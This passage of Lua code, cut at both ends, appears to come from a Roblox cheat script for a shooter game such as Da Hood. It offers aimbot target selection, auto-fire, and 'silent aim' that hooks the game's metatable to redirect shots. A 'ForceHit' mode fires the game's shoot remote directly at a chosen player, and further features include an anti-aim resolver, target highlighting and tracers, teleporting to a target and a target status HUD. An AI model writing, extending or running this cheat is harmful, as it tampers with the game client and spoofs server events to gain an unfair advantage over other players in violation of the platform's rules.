                    if Options.Checks.Value["ForceField"] then
                        noForceField = not char:FindFirstChildOfClass("ForceField")
                    end
                    local notKO = true
                    if Options.Checks.Value["KO"] then
                        local body = char:FindFirstChild("BodyEffects")
                        local ko = body and body:FindFirstChild("K.O")
                        notKO = ko and not ko.Value or true
                    end
                    local notGrabbed = true
                    if Options.Checks.Value["Grab"] then
                        notGrabbed = not char:FindFirstChild("GRABBING_CONSTRAINT")
                    end
                    local notTeam = true
                    if Options.Checks.Value["Team"] then
                        notTeam = player.Team ~= Players.LocalPlayer.Team
                    end
                    local noWall = true
                    if Options.Checks.Value["Wall"] then
                        local ignore = {Players.LocalPlayer.Character}
                        local direction = (root.Position - camera.CFrame.Position).Unit
                        local ray = Ray.new(camera.CFrame.Position, direction * (root.Position - camera.CFrame.Position).Magnitude)
                        local hit, _ = workspace:FindPartOnRayWithIgnoreList(ray, ignore)
                        noWall = not hit or hit:IsDescendantOf(char)
                    end
                    if noForceField and notKO and notGrabbed and notTeam and noWall then
                        minDist = dist
                        closest = player
                    end
                end
            end
        end
    end
    return closest
end
TargetAimBox:AddToggle("TargetAimEnabled", {
    Text = "Target Aim",
    Default = true,
})

TargetAimBox:AddLabel("select target"):AddKeyPicker("SelectTargetKey", {
    Default = "Q",
    Mode = "Press",
    Callback = function()
        if Toggles.TargetAimEnabled.Value then
	        if target then 
	            target = nil 
	        else 
	            target = getNearestTarget()
	        end
        end
    end,
})

local ScreenGui
if not CoreGui:FindFirstChild("ten") then
    ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "ten"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.Parent = CoreGui
end

function CreateButton(name, defaultPosition, callback)
    local Button = Instance.new("TextButton")
    Button.Name = name
    Button.Size = UDim2.new(0, 120, 0, 44)
    Button.Position = defaultPosition
    Button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Button.Text = name
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.Font = Enum.Font.Code
    Button.TextSize = 15
    Button.AutoButtonColor = false
    Button.Parent = ScreenGui
    local Corner = Instance.new("UICorner", Button)
    Corner.CornerRadius = UDim.new(0, 10)
    local Shadow = Instance.new("Frame", Button)
    Shadow.Size = UDim2.new(1, 6, 1, 6)
    Shadow.Position = UDim2.new(0, -3, 0, -3)
    Shadow.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    Shadow.BackgroundTransparency = 0.6
    Shadow.ZIndex = Button.ZIndex - 1
    Instance.new("UICorner", Shadow).CornerRadius = UDim.new(0, 10)
    local isActive = false
    function updateVisual()
        TweenService:Create(Shadow, TweenInfo.new(0.3), {
            BackgroundColor3 = isActive and Color3.fromRGB(67, 28, 72) or Color3.fromRGB(50, 50, 50)
        }):Play()
    end
    updateVisual()
    Button.MouseButton1Click:Connect(function()
        isActive = not isActive
        updateVisual()
        if callback then pcall(callback, isActive) end
    end)
    local dragStart, startPos
    Button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragStart = input.Position
            startPos = Button.Position
            local connection
            connection = input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    connection:Disconnect()
                    dragStart = nil
                    startPos = nil
                end
            end)
        end
    end)
    Button.InputChanged:Connect(function(input)
        if dragStart and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            Button.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
        end
    end)
    return Button
end

local SetTargetButton
TargetAimBox:AddToggle("SetTargetMobileButton", {
    Text = "Set Target Mobile",
    Default = false,
    Callback = function(value)
        if value then
            if not SetTargetButton then
                SetTargetButton = CreateButton("Set Target", UDim2.new(0.5, -60, 0.5, -22), function(state)
                    if state then
                        target = getNearestTarget()
                    else
                        target = nil
                    end
                end)
            end
            SetTargetButton.Visible = true
        else
            if SetTargetButton then
                SetTargetButton.Visible = false
            end
        end
    end,
})

TargetAimBox:AddToggle("AutoSelect", {
    Text = "Auto Select",
    Default = false,
})
TargetAimBox:AddToggle("UseFOV", {
    Text = "FOV",
    Default = false,
})
local depboxfov = TargetAimBox:AddDependencyBox()
depboxfov:AddToggle("ShowFOV", {
    Text = "Show FOV",
    Default = false,
}):AddColorPicker("FOVColor", {
    Default = Color3.new(1, 1, 1),
    Title = "FOV Color",
})

depboxfov:AddSlider("FOVSize", {
    Text = "FOV Size",
    Default = 150,
    Min = 1,
    Max = 1000,
    Rounding = 0,
})
depboxfov:SetupDependencies({
	{ Toggles.UseFOV, true } 
})
TargetAimBox:AddDropdown("Checks", {
    Values = { "ForceField", "KO", "Grab", "Team", "Wall" },
    Default = { ForceField = false, KO = false, Grab = false, Team = false },
    Multi = true,
    Text = "Checks",
})
TargetAimBox:AddDropdown("HitPart", {
    Values = { "Head", "UpperTorso", "LowerTorso", "HumanoidRootPart" },
    Default = 1,
    Multi = false,
    Text = "Hit Part",
})
TargetAimBox:AddToggle("ClosestPart", {
    Text = "Closest Part",
    Default = false,
    Tooltip = "Automatically select the body part closest to you (override Hit Part)"
})
local supportHook = hookmetamethod ~= nil
local modes = {"Camera"}
if supportHook then table.insert(modes, "Silent") end
if isDaHood then table.insert(modes, "ForceHit") end

TargetAimBox:AddDropdown("Mode", {
    Values = modes,
    Default = isDaHood and { "ForceHit" } or supportHook and { "Silent" },
    Multi = true,
    Text = "Mode",
})
if not supportHook then
	TargetAimBox:AddLabel("your executor\ndoesnt support silent aim")
end
AutofireBox:AddToggle("AutoFire", {
    Text = "Auto shoot (universal)",
    Default = false,
}):AddKeyPicker("AutoFireKey", {
    Default = "none",
    Mode = "Toggle",
    SyncToggleState = true,
    Text = "Auto Fire Key",
})
local depboxfire = AutofireBox:AddDependencyBox()
depboxfire:AddLabel("use it with silent aim")
depboxfire:SetupDependencies({
	{ Toggles.AutoFire, true } 
})
local LocalPlayer = Players.LocalPlayer
-- AutoFire cooldown
local lastShootTime = 0
local shootCooldown = 0.2
function canShootTarget(tgt)
    if not tgt or not tgt.Character then return false end
    local localRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local targetRoot = tgt.Character:FindFirstChild("HumanoidRootPart")
    if not localRoot or not targetRoot then return false end

    if tgt.Character:FindFirstChildOfClass("ForceField") then return false end

    local bodyEffects = tgt.Character:FindFirstChild("BodyEffects")
    local ko = bodyEffects and bodyEffects:FindFirstChild("K.O")
    if ko and ko.Value then return false end

    local rayParams = RaycastParams.new()
    rayParams.FilterDescendantsInstances = {LocalPlayer.Character}
    rayParams.FilterType = Enum.RaycastFilterType.Blacklist

    local rayResult = workspace:Raycast(localRoot.Position, (targetRoot.Position - localRoot.Position).Unit * (targetRoot.Position - localRoot.Position).Magnitude, rayParams)
    return not rayResult or rayResult.Instance:IsDescendantOf(tgt.Character)
end

RunService.Heartbeat:Connect(function()
    if Toggles.AutoFire.Value 
       and target 
       and tick() - lastShootTime > shootCooldown 
       and canShootTarget(target) then
        
        local tool = LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
        if tool and tool:IsA("Tool") then  -- Ensure holding a tool
            local ammo = tool:FindFirstChild("Ammo")  -- Assuming ammo is a child value (common in Roblox gun scripts; adjust path if different, e.g., tool.Ammo.Value)
            if ammo and ammo.Value > 0 then
                tool:Activate()  -- Use tool activation if ammo remains
            else
                mouse1press()
                task.wait(0.01)
                mouse1release()
            end
        else
            -- Fallback to mouse1 if not holding tool (or add logic to equip tool if needed)
            mouse1press()
            task.wait(0.01)
            mouse1release()
        end
        lastShootTime = tick()
    end
end)
TargetAimBox:AddSlider("Smoothness", {
    Text = "Smoothness",
    Default = 1,
    Min = 0,
    Max = 1,
    Rounding = 2,
})
local ReplicatedStorage = game:GetService("ReplicatedStorage")
TargetAimBox:AddInput("Prediction", {
    Text = "Prediction",
    Default = "0",
    Placeholder = "0",
    Numeric = true,
})
autoPredictionEnabled = false
TargetAimBox:AddToggle("AutoPrediction", {
    Text = "Auto Prediction",
    Default = false,
    Callback = function(state)
        autoPredictionEnabled = state
    end
})
local predictionValue = 0

-- Tạo label (ban đầu để trống)
WarningLabel = TargetAimBox:AddLabel("")

function updatePrediction()
    predictionValue = tonumber(Options.Prediction.Value) or 0
    
    if predictionValue > 0.7 then
        WarningLabel:SetText("if dont know - set 0 pls")
    else
        WarningLabel:SetText("")
    end
end

Options.Prediction:OnChanged(updatePrediction)
updatePrediction()
function KnockCheck(player)
    if player and player.Character then
        local bodyEffects = player.Character:FindFirstChild("BodyEffects")
        if bodyEffects then
            local knockOut = bodyEffects:FindFirstChild("K.O")
            return knockOut and knockOut.Value == true
        end
    end
    return false
end
function getClosestPart(target)
    if not target or not target.Character then return nil end
    local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not myRoot then return nil end

    local closestPart = nil
    local minDist = math.huge

    for _, part in ipairs(target.Character:GetChildren()) do
        if part:IsA("BasePart") then
            local dist = (part.Position - myRoot.Position).Magnitude
            if dist < minDist then
                minDist = dist
                closestPart = part
            end
        end
    end
    return closestPart or target.Character:FindFirstChild("HumanoidRootPart")
end

function getHitPart(tgt)
    if not tgt or not tgt.Character then return nil end
    if Toggles.ClosestPart.Value then
        return getClosestPart(tgt)
    end
    return tgt.Character:FindFirstChild(Options.HitPart.Value)
end
local ping = game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue()
if supportHook then
    local Meta = getrawmetatable(game)
    local backupindex = Meta.__index
    setreadonly(Meta, false)
    
    Meta.__index = function(t, k)
        if k:lower() == "hit" then
            if Options.Mode.Value["Silent"] 
            and target 
            and target.Character 
            and target.Character:FindFirstChild(Options.HitPart.Value) then
                
                local hitPart = getHitPart(target)
                local playerChar = LocalPlayer.Character
                
                if playerChar 
                and playerChar:FindFirstChild("HumanoidRootPart")
                and playerChar:FindFirstChild("Humanoid")
                and playerChar:FindFirstChild("Head") then
                    
                    if not KnockCheck(target) and not target.Character:FindFirstChildOfClass("ForceField") then
                        
                        return hitPart.CFrame + hitPart.AssemblyLinearVelocity * (autoPredictionEnabled and (ping / 2000) or predictionValue)
                    end
                end
            end
        end
        
        return backupindex(t, k)
    end
end

local defensive_positions = {}
local ragebot_aim_position = nil
local target_velocity = Vector3.new(0,0,0)
local target_last_position = nil
local last_refresh = 0
local last_fire = 0
local resolver_rate = 0.05
local void_spam_resolver_accuracy = 1.349251
local void_spam_resolver_lerp = 0.1
local void_spam_resolver_void_weight = 0.2
local void_spam_resolver_position_weight = 1.5

local forceHitConnection
if MainEvent then
    forceHitConnection = RunService.Heartbeat:Connect(function()
        if not Options.Mode.Value["ForceHit"] or not target or not target.Character then return end
        
        local char = target.Character
        local hitPart = getHitPart(target)
        local torso = char:FindFirstChild("HumanoidRootPart")
        local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
        local handle = tool and tool:FindFirstChild("Handle")
        if not hitPart or not handle or KnockCheck(target) or char:FindFirstChildOfClass("ForceField") then return end
        
        local aimPos = hitPart.Position
        aimPos = aimPos + (hitPart.AssemblyLinearVelocity * my_ping / 500)
        
        -- Defensive void spam (giữ nguyên)
        if Toggles.Resolver.Value then
            local currentTime = tick()
            local toRemove = {}
            for pos, data in pairs(defensive_positions) do
                local timeDelta = currentTime - data.last
                data.weight = data.weight - (timeDelta * 0.8)
                data.last = currentTime
                if data.weight < 0.1 then table.insert(toRemove, pos) end
            end
            for _, p in ipairs(toRemove) do defensive_positions[p] = nil end
            
            local weight = (aimPos.Magnitude < 900000 and void_spam_resolver_position_weight or void_spam_resolver_void_weight)
            local done = false
            for pos, data in pairs(defensive_positions) do
                if (pos - aimPos).Magnitude <= 200 then
                    local newPos = pos:Lerp(aimPos, void_spam_resolver_lerp)
                    defensive_positions[newPos] = {weight = math.clamp(data.weight + weight, -1, 18), last = currentTime}
                    defensive_positions[pos] = nil
                    done = true
                    break
                end
            end
            if not done then
                defensive_positions[aimPos] = {weight = weight, last = currentTime}
            end
            
            local bestPos, bestWeight = nil, 0
            for pos, data in pairs(defensive_positions) do
                if data.weight > bestWeight then bestWeight = data.weight; bestPos = pos end
            end
            if bestPos and bestWeight > void_spam_resolver_accuracy then
                aimPos = bestPos
                target_velocity = Vector3.new(0,0,0)
            end
        end

        -- ==================== THÊM CHECK: NHÂN VẬT KHÔNG THẤY TARGET THÌ KHÔNG BẮN ====================
        local rayOrigin = handle.Position
        local rayDirection = aimPos - rayOrigin
        local ray = Ray.new(rayOrigin, rayDirection)
        local ignoreList = {LocalPlayer.Character, target.Character}
        
        local hitPartRay = workspace:FindPartOnRayWithIgnoreList(ray, ignoreList)
        if hitPartRay then
            return 
        end
        -- ===========================================================================================

        local diff = hitPart.Position - handle.Position
        local Magnitude = diff.Magnitude
        if Magnitude > 0 and Magnitude == Magnitude then
            dir = diff.Unit
        else
            dir = (handle.Position - hitPart.Position).Unit 
        end
        
        MainEvent:FireServer(
            "ShootGun",
            handle,
            handle.Position,
            aimPos,
            hitPart,
            dir
        )
    end)
end
outlinehighlight = Color3.new(1, 1, 1)
TargetBox:AddToggle("HighlightTarget", {
    Text = "Highlight Target",
    Default = false,
}):AddColorPicker("FillColor", {
    Default = Color3.new(1, 1, 1),
    Title = "Fill Color",
}):AddColorPicker("OutlineColor", {
    Default = Color3.new(1, 1, 1),
    Title = "Outline Color",  
    Callback = function(value)
        outlinehighlight = value
    end
})
local depboxhl = TargetBox:AddDependencyBox()
depboxhl:AddSlider("FillTransparency", {
    Text = "Fill Transparency",
    Default = 0.5,
    Min = 0,
    Max = 1,
    Rounding = 2,
})
depboxhl:AddSlider("OutlineTransparency", {
    Text = "Outline Transparency",
    Default = 0,
    Min = 0,
    Max = 1,
    Rounding = 2,
})
depboxhl:SetupDependencies({
	{ Toggles.HighlightTarget, true } 
})
TargetBox:AddToggle("Tracer", {
    Text = "Tracer",
    Default = true,
}):AddColorPicker("TracerColor", {
    Default = Color3.new(1, 1, 1),
    Title = "Tracer Color",
})
local depboxtracer = TargetBox:AddDependencyBox()
depboxtracer:AddDropdown("TracerFrom", {
    Values = { "Mouse", "Head", "HumanoidRootPart", "Tool" },
    Default = 1,
    Multi = false,
    Text = "Tracer From",
})
depboxtracer:SetupDependencies({
	{ Toggles.Tracer, true } 
})

do
TargetBox:AddToggle("TargetStats", {
    Text = "Target Stats",
    Default = false,
})
local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
LocalPlayer.CharacterAdded:Connect(function(char)
    hrp = char:WaitForChild('HumanoidRootPart')
end)

local Colors = {  -- Cập nhật màu tím dark
    Background = Color3.fromRGB(250, 248, 245),
    Main = Color3.fromRGB(255, 255, 255),
    Accent = Color3.fromRGB(90, 24, 154),  -- Tím dark chính
    Secondary = Color3.fromRGB(200, 220, 195),
    Border = Color3.fromRGB(220, 218, 215),
    Text = Color3.fromRGB(80, 80, 80),
    TextLight = Color3.fromRGB(120, 120, 120),
    Alive = Color3.fromRGB(90, 24, 154),  -- Tím dark cho alive
    Knocked = Color3.fromRGB(255, 193, 86),
    Grabbing = Color3.fromRGB(255, 138, 101),
    Dead = Color3.fromRGB(255, 107, 107),
}

function IsMobile()
    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
end

function GetStatus(plr)
    if not plr or not plr.Character then
        return 'Dead', false, Colors.Dead
    end
    local hum = plr.Character:FindFirstChildOfClass('Humanoid')
    if not hum or hum.Health <= 0 then
        return 'Dead', false, Colors.Dead
    end
    local be = plr.Character:FindFirstChild('BodyEffects')
    if be then
        local grab = be:FindFirstChild('GRABBING_CONSTRAINT')
        local ko = be:FindFirstChild('K.O')
        if grab and grab.Value then
            return 'Grabbing', false, Colors.Grabbing
        end
        if ko and ko.Value then
            return 'Knocked', false, Colors.Knocked
        end
    end
    return 'Alive', true, Colors.Alive
end

local ScreenGui = Instance.new('ScreenGui')
ScreenGui.Name = 'bunnyTargetHUD'
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game:GetService('CoreGui')

local MainFrame = Instance.new('Frame')
MainFrame.Name = 'MainFrame'
MainFrame.Size = IsMobile() and UDim2.new(0, 280, 0, 110) or UDim2.new(0, 320, 0, 120)
MainFrame.Position = IsMobile() and UDim2.new(0.5, -140, 0.88, -55) or UDim2.new(0.5, -160, 0.78, -60)
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = false
MainFrame.Active = true
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new('UICorner')
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = MainFrame

local MainStroke = Instance.new('UIStroke')
MainStroke.Color = Colors.Accent  -- Tím dark
MainStroke.Thickness = 1.5
MainStroke.Transparency = 0.5
MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
MainStroke.Parent = MainFrame

local Glow = Instance.new('ImageLabel')
Glow.Name = 'Glow'
Glow.Size = UDim2.new(1, 40, 1, 40)
Glow.Position = UDim2.new(0.5, 0, 0.5, 0)
Glow.AnchorPoint = Vector2.new(0.5, 0.5)
Glow.BackgroundTransparency = 1
Glow.Image = 'rbxassetid://5554236805'
Glow.ImageColor3 = Colors.Accent  -- Tím dark
Glow.ImageTransparency = 0.92
Glow.ScaleType = Enum.ScaleType.Slice
Glow.SliceCenter = Rect.new(23, 23, 277, 277)
Glow.ZIndex = -1
Glow.Parent = MainFrame

-- Các phần còn lại của HUD giữ nguyên, chỉ thay màu ở AvatarStroke, StatusDot, HealthBar, HealthGradient sang tím dark tương tự
local AvatarContainer = Instance.new('Frame')
AvatarContainer.Name = 'AvatarContainer'
AvatarContainer.Size = UDim2.new(0, 60, 0, 60)
AvatarContainer.Position = UDim2.new(0, 12, 0, 12)
AvatarContainer.BackgroundColor3 = Color3.fromRGB(12, 12, 15)
AvatarContainer.BorderSizePixel = 0
AvatarContainer.Parent = MainFrame

local AvatarCorner = Instance.new('UICorner')
AvatarCorner.CornerRadius = UDim.new(1, 0)
AvatarCorner.Parent = AvatarContainer

local AvatarStroke = Instance.new('UIStroke')
AvatarStroke.Color = Colors.Accent  -- Tím dark
AvatarStroke.Thickness = 2
AvatarStroke.Transparency = 0
AvatarStroke.Parent = AvatarContainer

local Avatar = Instance.new('ImageLabel')
Avatar.Name = 'Avatar'
Avatar.Size = UDim2.new(1, -4, 1, -4)
Avatar.Position = UDim2.new(0, 2, 0, 2)
Avatar.BackgroundTransparency = 1
Avatar.Image = ''
Avatar.Parent = AvatarContainer

local AvatarImageCorner = Instance.new('UICorner')
AvatarImageCorner.CornerRadius = UDim.new(1, 0)
AvatarImageCorner.Parent = Avatar

local StatusDot = Instance.new('Frame')
StatusDot.Name = 'StatusDot'
StatusDot.Size = UDim2.new(0, 14, 0, 14)
StatusDot.Position = UDim2.new(1, -14, 1, -14)
StatusDot.BackgroundColor3 = Colors.Accent  -- Tím dark
StatusDot.BorderSizePixel = 0
StatusDot.Parent = AvatarContainer

local DotCorner = Instance.new('UICorner')
DotCorner.CornerRadius = UDim.new(1, 0)
DotCorner.Parent = StatusDot

local DotStroke = Instance.new('UIStroke')
DotStroke.Color = Color3.fromRGB(18, 18, 22)
DotStroke.Thickness = 2
DotStroke.Parent = StatusDot

local InfoContainer = Instance.new('Frame')
InfoContainer.Name = 'InfoContainer'
InfoContainer.Size = UDim2.new(1, -88, 0, 60)
InfoContainer.Position = UDim2.new(0, 80, 0, 12)
InfoContainer.BackgroundTransparency = 1
InfoContainer.Parent = MainFrame

local PlayerName = Instance.new('TextLabel')
PlayerName.Name = 'PlayerName'
PlayerName.Size = UDim2.new(1, -50, 0, 18)
PlayerName.Position = UDim2.new(0, 0, 0, 0)
PlayerName.BackgroundTransparency = 1
PlayerName.Text = 'Username'
PlayerName.Font = Enum.Font.GothamBold
PlayerName.TextSize = IsMobile() and 13 or 14
PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayerName.TextXAlignment = Enum.TextXAlignment.Left
PlayerName.TextTruncate = Enum.TextTruncate.AtEnd
PlayerName.Parent = InfoContainer

local DisplayName = Instance.new('TextLabel')
DisplayName.Name = 'DisplayName'
DisplayName.Size = UDim2.new(1, 0, 0, 14)
DisplayName.Position = UDim2.new(0, 0, 0, 18)
DisplayName.BackgroundTransparency = 1
DisplayName.Text = '@displayname'
DisplayName.Font = Enum.Font.Gotham
DisplayName.TextSize = IsMobile() and 10 or 11
DisplayName.TextColor3 = Color3.fromRGB(180, 180, 190)
DisplayName.TextXAlignment = Enum.TextXAlignment.Left
DisplayName.TextTruncate = Enum.TextTruncate.AtEnd
DisplayName.Parent = InfoContainer

local DistanceBadge = Instance.new('Frame')
DistanceBadge.Name = 'DistanceBadge'
DistanceBadge.Size = UDim2.new(0, 45, 0, 18)
DistanceBadge.Position = UDim2.new(1, -45, 0, 0)
DistanceBadge.BackgroundColor3 = Color3.fromRGB(12, 12, 15)
DistanceBadge.BorderSizePixel = 0
DistanceBadge.Parent = InfoContainer

local DistBadgeCorner = Instance.new('UICorner')
DistBadgeCorner.CornerRadius = UDim.new(0, 6)
DistBadgeCorner.Parent = DistanceBadge

local DistanceText = Instance.new('TextLabel')
DistanceText.Name = 'DistanceText'
DistanceText.Size = UDim2.new(1, 0, 1, 0)
DistanceText.BackgroundTransparency = 1
DistanceText.Text = '0m'
DistanceText.Font = Enum.Font.GothamBold
DistanceText.TextSize = IsMobile() and 9 or 10
DistanceText.TextColor3 = Colors.Accent  -- Tím dark
DistanceText.Parent = DistanceBadge

local HealthBarBG = Instance.new('Frame')
HealthBarBG.Name = 'HealthBarBG'
HealthBarBG.Size = UDim2.new(1, 0, 0, 6)
HealthBarBG.Position = UDim2.new(0, 0, 0, 38)
HealthBarBG.BackgroundColor3 = Color3.fromRGB(12, 12, 15)
HealthBarBG.BorderSizePixel = 0
HealthBarBG.Parent = InfoContainer

local HealthBarBGCorner = Instance.new('UICorner')
HealthBarBGCorner.CornerRadius = UDim.new(1, 0)
HealthBarBGCorner.Parent = HealthBarBG

local HealthBar = Instance.new('Frame')
HealthBar.Name = 'HealthBar'
HealthBar.Size = UDim2.new(1, 0, 1, 0)
HealthBar.BackgroundColor3 = Colors.Accent  -- Tím dark
HealthBar.BorderSizePixel = 0
HealthBar.Parent = HealthBarBG

local HealthBarCorner = Instance.new('UICorner')
HealthBarCorner.CornerRadius = UDim.new(1, 0)
HealthBarCorner.Parent = HealthBar

local HealthGradient = Instance.new('UIGradient')
HealthGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Colors.Accent),  -- Tím dark
    ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 50, 200)),  -- Gradient tím nhạt hơn
}
HealthGradient.Rotation = 0
HealthGradient.Parent = HealthBar

local HealthText = Instance.new('TextLabel')
HealthText.Name = 'HealthText'
HealthText.Size = UDim2.new(1, 0, 0, 12)
HealthText.Position = UDim2.new(0, 0, 0, 46)
HealthText.BackgroundTransparency = 1
HealthText.Text = '100/100'
HealthText.Font = Enum.Font.GothamMedium
HealthText.TextSize = IsMobile() and 9 or 10
HealthText.TextColor3 = Color3.fromRGB(180, 180, 190)
HealthText.TextXAlignment = Enum.TextXAlignment.Left
HealthText.Parent = InfoContainer

local ButtonContainer = Instance.new('Frame')
ButtonContainer.Name = 'ButtonContainer'
ButtonContainer.Size = UDim2.new(1, -24, 0, 24)
ButtonContainer.Position = UDim2.new(0, 12, 1, -32)
ButtonContainer.BackgroundTransparency = 1
ButtonContainer.Parent = MainFrame

local ButtonLayout = Instance.new('UIListLayout')
ButtonLayout.FillDirection = Enum.FillDirection.Horizontal
ButtonLayout.Padding = UDim.new(0, 6)
ButtonLayout.SortOrder = Enum.SortOrder.LayoutOrder
ButtonLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
ButtonLayout.Parent = ButtonContainer

local spectating = false
function CreateButton1(text, layoutOrder, callback)
    local button = Instance.new('TextButton')
    button.Name = text .. 'Button'
    button.Size = UDim2.new(0, IsMobile() and 75 or 85, 0, 24)
    button.BackgroundColor3 = Color3.fromRGB(12, 12, 15)
    button.BorderSizePixel = 0
    button.Text = text
    button.Font = Enum.Font.GothamMedium
    button.TextSize = IsMobile() and 9 or 10
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.AutoButtonColor = false
    button.LayoutOrder = layoutOrder
    button.Parent = ButtonContainer
    local corner = Instance.new('UICorner')
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = button
    local stroke = Instance.new('UIStroke')
    stroke.Color = Colors.Accent  -- Tím dark
    stroke.Thickness = 1
    stroke.Transparency = 0.7
    stroke.Parent = button
    button.MouseEnter:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.15), {
            BackgroundColor3 = Colors.Accent,  -- Tím dark
        }):Play()
        TweenService:Create(stroke, TweenInfo.new(0.15), {
            Transparency = 0,
        }):Play()
    end)
    button.MouseLeave:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.15), {
            BackgroundColor3 = Color3.fromRGB(12, 12, 15),
        }):Play()
        TweenService:Create(stroke, TweenInfo.new(0.15), {
            Transparency = 0.7,
        }):Play()
    end)
    button.MouseButton1Click:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.05), {
            Size = UDim2.new(0, (IsMobile() and 75 or 85) - 4, 0, 20),
        }):Play()
        task.wait(0.05)
        TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Back), {
            Size = UDim2.new(0, IsMobile() and 75 or 85, 0, 24),
        }):Play()
        if callback then
            callback()
        end
    end)
    return button
end

local SpectateButton = CreateButton1('Spectate', 1, function()
    spectating = not spectating
    SpectateButton.Text = spectating and 'Stop' or 'Spectate'
end)

local TPButton = CreateButton1('TP', 2, function()
    if target and target.Character and target.Character:FindFirstChild('HumanoidRootPart') then
        LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
    end
end)

local ClearButton = CreateButton1('Clear', 3, function()
    target = nil
    if tracer then
        -- tracer:Destroy() -- Nếu có tracer
    end
    if tracerOutline then
        -- tracerOutline:Destroy()
    end
    if BodyClone then
        SetRigTransparency(BodyClone, 1)
    end
    if DesyncLine then
        DesyncLine.Visible = false
    end
    if BodyCloneHighlight then
        BodyCloneHighlight.Enabled = false
    end
    MainFrame.Visible = false
end)

-- Drag với hiệu ứng đẹp hơn (tween position mượt, glow flash khi bắt đầu drag)
local dragging = false
local dragInput, dragStart, startPos
function update(input)
    local delta = input.Position - dragStart
    TweenService:Create(MainFrame, TweenInfo.new(0.08), {
        Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y),
    }):Play()
end

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        -- Hiệu ứng glow flash
        TweenService:Create(Glow, TweenInfo.new(0.2), {ImageTransparency = 0.8}):Play()
        task.delay(0.2, function()
            TweenService:Create(Glow, TweenInfo.new(0.2), {ImageTransparency = 0.92}):Play()
        end)
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        update(input)
    end
end)

local oldCam = nil
local lastHealth = 100

RunService.Heartbeat:Connect(function()
    if not (Toggles.TargetStats.Value) then
        MainFrame.Visible = false
        return
    end
    if not target then
        MainFrame.Visible = false
        return
    end
    MainFrame.Visible = true
    Avatar.Image = 'rbxthumb://type=AvatarHeadShot&id=' .. target.UserId .. '&w=420&h=420'
    PlayerName.Text = target.Name
    DisplayName.Text = '@' .. target.DisplayName
    local status, alive, statusColor = GetStatus(target)
    StatusDot.BackgroundColor3 = statusColor
    AvatarStroke.Color = statusColor
    local character = target.Character
    local humanoid = character and character:FindFirstChildOfClass('Humanoid')
    if humanoid then
        local currentHealth = math.floor(humanoid.Health)
        local maxHealth = math.floor(humanoid.MaxHealth)
        local healthPercent = math.clamp(currentHealth / maxHealth, 0, 1)
        TweenService:Create(HealthBar, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = UDim2.new(healthPercent, 0, 1, 0),
        }):Play()
        HealthText.Text = currentHealth .. '/' .. maxHealth
        if healthPercent > 0.6 then
            HealthGradient.Color = ColorSequence.new{
                ColorSequenceKeypoint.new(0, Colors.Accent),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 50, 200)),
            }
        elseif healthPercent > 0.3 then
            HealthGradient.Color = ColorSequence.new{
                ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 180, 100)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 220, 150)),
            }
        else
            HealthGradient.Color = ColorSequence.new{
                ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 80, 120)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 140, 160)),
            }
        end
        lastHealth = currentHealth
    end
    if character and character:FindFirstChild('HumanoidRootPart') and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
        local distance = (character.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
